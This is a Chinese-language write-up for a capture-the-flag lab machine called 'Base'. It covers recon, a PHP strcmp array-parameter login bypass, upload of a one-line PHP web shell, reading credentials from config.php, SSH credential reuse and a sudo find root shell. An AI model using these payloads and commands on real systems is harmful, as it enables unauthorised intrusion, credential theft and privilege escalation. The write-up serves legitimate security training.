# Base — Writeup

## 目标范围

本题保留原版 Base 的完整两阶段攻击链：

1. 通过目录列表与 Vim swap 文件发现 PHP 登录实现；
2. 利用 PHP 7.2 的 \`strcmp(array, string)\` 类型处理绕过认证；
3. 使用真实文件上传功能上传 PHP 命令执行文件；
4. 以 \`www-data\` 身份读取 Web 配置中的凭据；
5. 利用凭据复用通过 SSH 登录 \`john\`，取得 User Flag；
6. 利用 \`john\` 被允许以 root 身份运行的 \`find\` 执行命令，取得 Root Flag。

这不是模拟的 PHP 认证或提权链。靶机使用 PHP 7.2、Apache、OpenSSH、sudo 和 GNU find。User / Root 两个 Flag 分别验证 Web 初始访问和真实 Linux 提权阶段。

## 1. 侦察与发现

枚举 HTTP 和 SSH 服务：

\`\`\`bash
nmap -sC -sV -p22,80 <TARGET>
\`\`\`

浏览登录目录：

\`\`\`bash
curl -i http://<TARGET>/login/
\`\`\`

目录列表暴露 \`login.php\`、\`config.php\` 和 \`login.php.swp\`。下载 Vim swap 文件：

\`\`\`bash
curl -fsS -o login.php.swp http://<TARGET>/login/login.php.swp
strings login.php.swp | tac
\`\`\`

分析恢复出的 PHP 代码，注意用户名和密码都通过 \`strcmp()\` 与 POST 参数比较。

## 2. PHP 7.2 strcmp 类型绕过

原代码使用：

\`\`\`php
if (strcmp($username, $_POST['username']) == 0) {
    if (strcmp($password, $_POST['password']) == 0) {
        $_SESSION['user_id'] = 1;
        header("Location: /upload.php");
    }
}
\`\`\`

PHP 7.2 中，当 \`strcmp()\` 的参数类型不正确（例如数组与字符串比较）时会发出 warning 并返回 \`NULL\`。由于应用使用宽松比较 \`== 0\`，\`NULL\` 会被当作与 0 相等，从而绕过认证。

在 Burp Repeater 中将登录请求改为：

\`\`\`http
username[]=admin&password[]=anything
\`\`\`

成功后应用会将会话重定向到文件上传页面。

## 3. 不受限制的 PHP 文件上传

创建一个仅用于实验环境的 PHP 命令执行文件：

\`\`\`php
<?php echo system($_REQUEST['cmd']); ?>
\`\`\`

通过正常上传表单上传该文件。使用目录扫描或观察上传响应，找到 \`/_uploaded/\` 目录，再请求：

\`\`\`text
http://<TARGET>/_uploaded/webshell.php?cmd=id
\`\`\`

命令以 Apache 的 \`www-data\` 用户身份运行。此处的关键是应用没有限制扩展名、MIME 类型或上传内容，并且上传目录允许 PHP 执行。

## 4. 从 Web 配置发现凭据复用

通过上传的命令执行文件读取登录配置：

\`\`\`bash
cat /var/www/html/login/config.php
\`\`\`

配置文件保存了 Web 登录用户名和密码。检查本机用户与服务，发现系统账户 \`john\` 复用了该密码。

## 5. SSH 登录并取得 User Flag

使用发现的凭据登录：

\`\`\`bash
ssh john@<TARGET>
\`\`\`

读取用户 Flag：

\`\`\`bash
cat /home/john/user.txt
\`\`\`

提交 User Flag，证明已经取得普通系统账户权限。

## 6. sudo find 提权并取得 Root Flag

检查 sudo 权限：

\`\`\`bash
sudo -l
\`\`\`

输出显示 \`john\` 可以以 root 身份执行 \`/usr/bin/find\`。GNU find 的 \`-exec\` 参数可以执行外部命令，因此可利用 GTFOBins 所记录的 sudo 场景：

\`\`\`bash
sudo find . -exec /bin/sh -p \\; -quit
\`\`\`

确认身份并读取 Root Flag：

\`\`\`bash
id
cat /root/root.txt
\`\`\`

提交 Root Flag 完成本题。

## 自动化验收

\`exploit.py\` 是独立攻击端。它通过 HTTP 完成 swap 文件发现、数组参数认证绕过、真实 PHP 文件上传和 Web 命令执行；随后从 Web 配置中提取凭据，通过 SSH 登录 \`john\`，读取 User Flag，再通过 sudo find 以 UID 0 执行命令并读取 Root Flag。

E2E 不挂载靶机文件系统、不使用 Docker socket，也不通过 \`docker exec\` 获取任何 Flag。两个 Flag 都必须通过题目预期的攻击路径精确回读。
